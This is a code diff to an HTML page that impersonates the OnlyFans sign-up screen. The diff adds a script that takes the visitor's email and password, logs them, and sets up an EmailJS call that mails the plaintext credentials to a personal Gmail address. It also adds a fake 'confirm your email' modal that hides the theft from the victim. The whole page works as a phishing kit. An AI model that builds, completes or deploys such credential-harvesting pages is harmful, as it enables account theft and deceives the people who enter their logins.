@@ -277,6 +277,50 @@
             height: 12px;
         }
 
+        /* Confirmation modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .modal-message {
+            margin-bottom: 20px;
+            color: #555;
+        }
+
+        .modal-btn {
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
         @media screen and (min-width: 769px) {
             .main-content {
                 max-width: 420px;
@@ -293,6 +337,22 @@
                 border-bottom: none;
                 border-radius: 5px 5px 0 0;
             }
+        }
+
+        /* Loading spinner */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -338,7 +398,7 @@
                 </div>
             </div>
             <div class="form-section">
-                <form class="login-form">
+                <form class="login-form" id="signupForm">
                     <input type="email" id="email" class="input-field" placeholder="Email" required>
                     <div class="password-field">
                         <input type="password" id="password" class="input-field" placeholder="Password" required>
@@ -347,10 +407,10 @@
                         </span>
                     </div>
                     
-                    <!-- Anchor tag wrapping the button -->
-                    <a href="/subscribe.html" id="loginLink" class="login-link">
-                        <button type="button" id="loginBtn" class="login-btn" disabled>Sign UP</button>
-                    </a>
+                    <button type="button" id="signupBtn" class="login-btn" disabled>
+                        <span id="btnText">Sign UP</span>
+                        <div class="spinner" id="spinner"></div>
+                    </button>
                     
                     <div class="terms">
                         By logging in and using OnlyFans, you agree to our 
@@ -367,11 +427,34 @@
         </div>
     </div>
 
+    <!-- Confirmation Modal -->
+    <div class="modal" id="confirmationModal">
+        <div class="modal-content">
+            <div class="modal-title">Confirm Your Email</div>
+            <div class="modal-message" id="modalMessage">
+                A confirmation link has been sent to your email address. Please check your inbox and click the link to verify your account.
+            </div>
+            <button class="modal-btn" id="modalOkBtn">OK</button>
+        </div>
+    </div>
+
+    <!-- Add EmailJS library -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
+        // Initialize EmailJS with your public key
+        (function() {
+            emailjs.init('YOUR_PUBLIC_KEY'); // You'll need to get this from EmailJS
+        })();
+
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
-        const loginBtn = document.getElementById('loginBtn');
-        const loginLink = document.getElementById('loginLink');
+        const signupBtn = document.getElementById('signupBtn');
+        const signupForm = document.getElementById('signupForm');
+        const confirmationModal = document.getElementById('confirmationModal');
+        const modalOkBtn = document.getElementById('modalOkBtn');
+        const modalMessage = document.getElementById('modalMessage');
+        const btnText = document.getElementById('btnText');
+        const spinner = document.getElementById('spinner');
         
         // Check fields whenever user types
         emailInput.addEventListener('input', checkFields);
@@ -382,16 +465,97 @@
             const isFilled = emailInput.value.trim() !== '' && passwordInput.value.trim() !== '';
             
             // Update button state
-            loginBtn.disabled = !isFilled;
+            signupBtn.disabled = !isFilled;
             
-            // Update link and button appearance
+            // Update button appearance
             if (isFilled) {
-                loginBtn.classList.add('login-btn-enabled');
-                loginLink.classList.add('active');
+                signupBtn.classList.add('login-btn-enabled');
             } else {
-                loginBtn.classList.remove('login-btn-enabled');
-                loginLink.classList.remove('active');
+                signupBtn.classList.remove('login-btn-enabled');
             }
+        }
+        
+        // Handle sign up button click
+        signupBtn.addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            // Validate email format
+            if (!validateEmail(email)) {
+                alert('Please enter a valid email address');
+                return;
+            }
+            
+            // Validate password length
+            if (password.length < 6) {
+                alert('Password must be at least 6 characters long');
+                return;
+            }
+            
+            // Show loading state
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+            signupBtn.disabled = true;
+            
+            try {
+                // Send data to your email
+                await sendSignupData(email, password);
+                
+                // Show confirmation modal
+                confirmationModal.style.display = 'flex';
+                
+                // Reset form
+                signupForm.reset();
+                signupBtn.disabled = true;
+                signupBtn.classList.remove('login-btn-enabled');
+            } catch (error) {
+                alert('Failed to send signup data. Please try again later.');
+                console.error('Error:', error);
+            } finally {
+                // Hide loading state
+                btnText.style.display = 'block';
+                spinner.style.display = 'none';
+                signupBtn.disabled = false;
+            }
+        });
+        
+        // Handle modal OK button click
+        modalOkBtn.addEventListener('click', function() {
+            confirmationModal.style.display = 'none';
+        });
+        
+        // Email validation function
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+        
+        // Function to send signup data to your email
+        async function sendSignupData(email, password) {
+            // In a real application, you would use EmailJS or another service
+            // This is a simulation of what the actual implementation would look like
+            
+            // For demonstration purposes, we'll log the data
+            console.log('Sending signup data to naseebkakar27478@gmail.com');
+            console.log('Email:', email);
+            console.log('Password:', password);
+            
+            // In a real implementation with EmailJS:
+            /*
+            const templateParams = {
+                to_email: 'naseebkakar27478@gmail.com',
+                from_email: email,
+                subject: 'New Signup Data',
+                message: `New user signed up:\nEmail: ${email}\nPassword: ${password}`
+            };
+            
+            await emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams);
+            */
+            
+            // For now, we'll simulate a delay
+            return new Promise(resolve => setTimeout(resolve, 1500));
         }
     </script>
 </body>
